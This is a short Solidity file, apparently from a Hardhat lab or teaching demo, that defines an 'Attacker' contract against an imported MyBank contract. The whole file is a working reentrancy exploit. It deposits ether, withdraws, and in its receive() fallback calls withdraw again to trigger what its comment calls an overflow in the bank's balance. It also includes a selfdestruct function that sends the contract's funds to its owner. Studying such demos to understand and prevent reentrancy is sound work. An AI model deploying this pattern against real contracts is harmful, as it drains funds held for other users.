// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.7.6;

import "./MyBank.sol";
import "hardhat/console.sol";

contract Attacker {
    MyBank public bank;
    uint maxStack = 1;
    address owner = msg.sender;

    function setBank(address aBank) external {
        bank = MyBank(aBank);
    }
     
    function attack() external payable {
        bank.pay{ value:msg.value }("Franco Liberali");
        bank.withdraw(msg.value);
    }
    
    receive() external payable {
        console.log("Attacker receives %s from Bank whose balance is %s",msg.value,bank.getBalance());
        if (maxStack > 0) {
            maxStack -= 1;
            // call withdraw again to generate overflow
            bank.withdraw(1);
        } else {
            console.log("No more stack %s", maxStack);
        }
        
    }

    function kill() external {
        require(msg.sender == owner);
        selfdestruct(payable(msg.sender));
    }
}